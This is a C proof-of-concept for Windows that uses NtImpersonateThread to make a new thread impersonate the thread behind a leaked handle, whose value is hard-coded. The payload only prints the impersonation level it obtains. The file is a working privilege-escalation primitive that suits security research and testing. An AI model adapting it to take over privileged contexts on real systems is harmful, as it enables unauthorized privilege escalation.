#include <Windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* NtImpersonateThread)(
    HANDLE ThreadHandle,
    HANDLE ThreadToImpersonate,
    PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

DWORD WINAPI ThreadFunction(LPVOID lpParam) {
    //HANDLE hNotepad = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 15072);
    //DWORD error = GetLastError();

    HANDLE hThreadToken = NULL;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {

        SECURITY_IMPERSONATION_LEVEL impersonationLevel;
        DWORD dwReturnLength = 0;

        GetTokenInformation(hThreadToken,
            TokenImpersonationLevel,
            &impersonationLevel,
            sizeof(impersonationLevel),
            &dwReturnLength);

        switch (impersonationLevel)
        {
        case SecurityAnonymous:
            printf("Impersonation Level: Anonymous\n");
            break;
        case SecurityIdentification:
            printf("Impersonation Level: Identification\n");
            break;
        case SecurityImpersonation:
            printf("Impersonation Level: Impersonation\n");
            break;
        case SecurityDelegation:
            printf("Impersonation Level: Delegation\n");
            break;
        default:
            printf("Unknown Impersonation Level\n");
            break;
        }
    }
    return 0;
}

int main(void) {

    // getc(stdin);

    // SET this to the leaked handle value. Find in something like System Informer/Process Hacker.
    HANDLE target = (HANDLE)0x120;

    NtImpersonateThread fNtImpersonateThread = (NtImpersonateThread)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtImpersonateThread");

    SECURITY_QUALITY_OF_SERVICE sqos = { 0 };
    sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    sqos.ImpersonationLevel = SecurityImpersonation;
    sqos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
    sqos.EffectiveOnly = FALSE;

    HANDLE hThread = CreateThread(NULL, 0, ThreadFunction, NULL, CREATE_SUSPENDED, NULL);
    if (!hThread) return 1;

    NTSTATUS ret = fNtImpersonateThread(hThread, target, &sqos);

    DWORD resumeRet = ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
